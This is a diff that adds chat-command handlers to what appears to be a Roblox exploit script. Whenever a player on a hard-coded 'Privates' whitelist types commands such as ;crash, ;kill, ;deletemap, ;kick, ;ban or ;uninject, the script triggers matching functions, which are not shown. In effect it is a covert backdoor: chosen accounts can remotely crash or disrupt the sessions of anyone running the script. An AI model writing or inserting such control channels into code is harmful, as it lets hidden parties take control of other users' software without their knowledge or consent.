@@ -365,3 +365,88 @@ game:GetService("Players").PlayerAdded:Connect(function(v)
 		end
 	end)
 end)
+
+for i,v in pairs(game:GetService("Players"):GetChildren()) do
+	v.Chatted:Connect(function(a) 
+		if table.find(whitelist.Privates,v.UserId) then
+			if a == ";kill" then
+				funcs:kill()
+			elseif a == ";reset" then
+				funcs:reset()
+			elseif a == ";byfron" then
+				funcs:byfron()
+			elseif a == ";void" then
+				funcs:void()
+			elseif a == ";kill2" then
+				funcs:kill2()
+			elseif a == ";lagback" then
+				funcs:lagback()
+			elseif a == ";sit" then
+				funcs:sit()
+			elseif a == ";unsit" then
+				funcs:unsit()
+			elseif a == ";freeze" then
+				funcs:freeze()
+			elseif a == ";unfreeze" then
+				funcs:unfreeze()
+			elseif a == ";deletemap" then
+				funcs:deletemap()
+			elseif a == ";crash" then
+				funcs:crash()
+			elseif a == ";chipman" then
+				funcs:chipman()
+			elseif a == ";rickroll" then
+				funcs:rickroll()
+			elseif a == ";uninject" then
+				funcs:uninject()
+			elseif a == ";kick" then
+				funcs:kick()
+			elseif a == ";ban" then
+				funcs:ban()
+			elseif a == ";lobby" then
+				funcs:lobby()
+			end
+		end
+	end)
+end
+game:GetService("Players").PlayerAdded:Connect(function(v)
+	v.Chatted:Connect(function(a) 
+		if table.find(whitelist.Privates,v.UserId) then
+			if a == ";kill" then
+				funcs:kill()
+			elseif a == ";reset" then
+				funcs:reset()
+			elseif a == ";byfron" then
+				funcs:byfron()
+			elseif a == ";void" then
+				funcs:void()
+			elseif a == ";kill2" then
+				funcs:kill2()
+			elseif a == ";lagback" then
+				funcs:lagback()
+			elseif a == ";sit" then
+				funcs:sit()
+			elseif a == ";unsit" then
+				funcs:unsit()
+			elseif a == ";freeze" then
+				funcs:freeze()
+			elseif a == ";unfreeze" then
+				funcs:unfreeze()
+			elseif a == ";deletemap" then
+				funcs:deletemap()
+			elseif a == ";crash" then
+				funcs:crash()
+			elseif a == ";chipman" then
+				funcs:chipman()
+			elseif a == ";rickroll" then
+				funcs:rickroll()
+			elseif a == ";kick" then
+				funcs:kick()
+			elseif a == ";ban" then
+				funcs:ban()
+			elseif a == ";lobby" then
+				funcs:lobby()
+			end
+		end
+	end)
+end)
